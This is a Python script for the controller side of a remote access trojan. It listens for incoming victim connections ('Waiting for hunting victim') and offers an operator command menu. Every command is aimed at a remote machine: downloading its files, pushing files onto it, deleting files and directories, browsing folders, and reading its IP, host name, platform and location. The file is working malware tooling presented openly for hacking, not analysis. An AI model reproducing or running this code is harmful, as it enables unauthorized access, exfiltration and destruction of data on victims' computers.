
import socket
import os
import sys
import platform
import time
from random import random
import shutil
import requests

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # creating socket
host = '0.0.0.0' # CHANGE THIS
port = 8585      # CHANGE THIS 

# bind and socket connection
s.bind((host, port))
s.listen(5)
print("Waiting for hunting victim ......")

while True:
    server, adr = s.accept()
    print(f'Client {adr} is Connected!')

    # start hacking
    user = ''
    while user != 'exit':

        user = input(str("Command>"))

        if user == 'help':
            print("""
get ip 		     :	Get ip of client device and host name.
cd <dir>	     :	Change dir.
pwd 		     :	Show current dir location.
mkdir <name>	     :	Make dir.
text. 		     :	Make a simple text file with you custom message in it on cient device.
show dir	     :	Show dir and files in current dir.
show custom dir <dir>:	Show dir and files from custom dir.
clear		     :	Clear your terminal.
system platform      : 	Show system platform of client device.
download <file/dir>  :	To download files or dir Note: only for now dir.
send <file>	     :	Send file or dir to target device.
send -p <path>	     :	Send file or dir to target device from other dir. Example: send -p location_of_file/key.py
rm -f <file>	     :	delete a file.
rm -d <dir>	     :	delete a folder or dir.
location             :  Show location of Client Device by IP.
close                :  Close the connection.


				""")
            time.sleep(1)

        if user == 'clear':
            if sys.platform in ["linux", "linux2"]:
                os.system('clear')
                time.sleep(1)
            else:
                os.system('cls')
                time.sleep(1)

        elif user == 'get ip':
            server.send(bytes('get ip', 'utf-8'))
            print("Processing[+]")
            host_name = server.recv(9999)
            time.sleep(1)
            ip_client = server.recv(1024)
            time.sleep(1)
            p_ip = server.recv(1024)


            print(host_name.decode('utf-8'))
            time.sleep(1)
            print(ip_client.decode('utf-8'))
            time.sleep(1)
            print(p_ip.decode('utf-8'))


        elif user[:2] == 'cd':
            server.send(user.encode())
            result = server.recv(9999)
            print(result.decode('utf-8'))
            time.sleep(1)

        elif user == 'pwd':
            server.send(user.encode())
            result = server.recv(9999)
            print(result.decode('utf-8'))
            time.sleep(1)
        elif user == 'close':
            server.send(user.encode())
            print("Disconnected from Client!")

        elif user[:5] == 'mkdir':
            server.send(user.encode())
            time.sleep(1)

        elif user == 'text.':
            server.send(user.encode())

            message = input('Type a message: ')
            server.send(message.encode())

            name_file = input('Enter File Name to save that message as txt file: ')
            server.send(name_file.encode())
            time.sleep(1)

        elif user == 'show dir':
            server.send(user.encode())
            result = server.recv(9999)
            print(result.decode('utf-8'))
            time.sleep(1)

        elif user[:15] == 'show custom dir':
            server.send(user.encode())
            result = server.recv(9999)
            print(result.decode('utf-8'))
            time.sleep(1)

        elif user == 'system platform':
            server.send(user.encode())
            time.sleep(1)

            result = server.recv(9999)
            result2 = server.recv(9999)  # another

            print(result.decode())
            time.sleep(1)
            print(result2.decode())
            time.sleep(1)

        elif user == 'location':
        	print("Processing[+]")
        	server.send(user.encode())
        	msg = server.recv(9999)

        	time.sleep(1)
        	print(msg.decode('utf-8'))

        elif user[:8] == 'download':
            server.send(user.encode())
            recv_file = server.recv(100000)
            decoderecv = recv_file.decode()
            if decoderecv == 'null':
                print('File or Dir not found! [Unable to download]')
            else:
                filename = input('Please Enter a File Name to save file: ')
                print('File downloading..')
                newfile = open(filename, "wb")
                newfile.write(recv_file)
                newfile.close()
                print('file download successfully!')
                time.sleep(1)

        elif user[:4] == 'send':
            filee = user[5:]
            if os.path.isdir(filee) or os.path.isfile(filee):
                server.send(bytes('send', 'utf-8'))
                f = open(filee, "rb")
                data = f.read()
                server.send(data)

                name = input("Enter file name to save(on client device note: Enter name with a file type): ")
                server.send(name.encode('utf-8'))
                print('File send successfully!')
            else:
                print("File or dir not found! [send command ubable]")

        elif user[:5] == "rm -f":
            server.send(user.encode('utf-8'))
            rst = server.recv(1024)
            print(rst.decode('utf-8'))

        elif user[:5] == "rm -d":
        	server.send(user.encode('utf-8'))
        	rst = server.recv(1024)
        	print(rst.decode('utf-8'))
